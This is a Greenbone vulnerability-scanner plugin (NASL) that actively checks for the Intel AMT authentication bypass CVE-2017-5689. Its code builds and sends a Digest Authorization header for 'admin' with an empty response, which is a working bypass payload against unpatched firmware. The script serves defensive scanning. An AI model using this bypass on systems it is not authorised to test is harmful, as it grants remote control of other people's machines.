# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:intel:active_management_technology_firmware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.810996");
  script_version("2024-08-23T15:40:37+0000");
  script_tag(name:"last_modification", value:"2024-08-23 15:40:37 +0000 (Fri, 23 Aug 2024)");
  script_tag(name:"creation_date", value:"2017-05-05 15:39:37 +0530 (Fri, 05 May 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-02-18 17:12:00 +0000 (Tue, 18 Feb 2020)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");

  script_cve_id("CVE-2017-5689");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Intel Active Management Technology Privilege Escalation Vulnerability (INTEL-SA-00075) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_intel_amt_http_detect.nasl");
  script_mandatory_keys("intel/amt/http/detected");
  script_require_ports("Services/www", 16992);

  script_tag(name:"summary", value:"Intel systems with Intel Active Management Technology enabled
  are prone to a privilege escalation vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists due to mishandling of input in an unknown
  function.");

  script_tag(name:"impact", value:"Successful exploitation will allow an unprivileged attacker to
  gain control of the manageability features provided by these products.");

  script_tag(name:"affected", value:"Intel Active Management Technology firmware versions 6.x
  before 6.2.61.3535, 7.x before 7.1.91.3272, 8.x before 8.1.71.3608, 9.0.x and 9.1.x before
  9.1.41.3024, 9.5.x before 9.5.61.3012, 10.x before 10.0.55.3000, 11.0.x before 11.0.25.3001,
  11.5.x and 11.6.x before 11.6.27.3264.");

  script_tag(name:"solution", value:"Update to version 6.2.61.3535, 7.1.91.3272, 8.1.71.3608,
  9.1.41.3024, 9.5.61.3012, 10.0.55.3000, 11.0.25.3001, 11.6.27.3264 or later.");

  script_xref(name:"URL", value:"https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00075.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/98269");
  script_xref(name:"URL", value:"https://arstechnica.com/security/2017/05/intel-patches-remote-code-execution-bug-that-lurked-in-cpus-for-10-years");
  script_xref(name:"URL", value:"https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/index.htm";

req = http_get_req(port: port, url: url);
res = http_keepalive_send_recv(port: port, data: req);

match = eregmatch(string: res, pattern: '"Digest.(.*)", nonce="(.*)",stale');
if (!isnull(match[1]) && !isnull(match[2])) {
  digest = match[1];
  nonce = match[2];
} else {
  exit(0);
}

cnonce = rand_str(length: 10);

asp_session = 'Digest username="admin", realm="Digest:' + digest + '", nonce="' + nonce +
              '", uri="/index.htm", response="", qop=auth, nc=00000001, cnonce="' + cnonce + '"';

headers = make_array("Authorization", asp_session);

req = http_get_req(port: port, url: url, add_headers: headers);
res = http_keepalive_send_recv(port:port, data:req);

if (res =~ "^HTTP/1\.[01] 200" && (">Hardware Information" >< res || ">IP address" >< res ||
                                  ">System ID" >< res || ">System<" >< res || ">Processor<" >< res ||
                                  ">Memory<" >< res)) {
  body = http_extract_body_from_response(data: res);
  report = 'It was possible to access /index.htm by bypassing authentication.\n\nResult:\n' + chomp(body);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
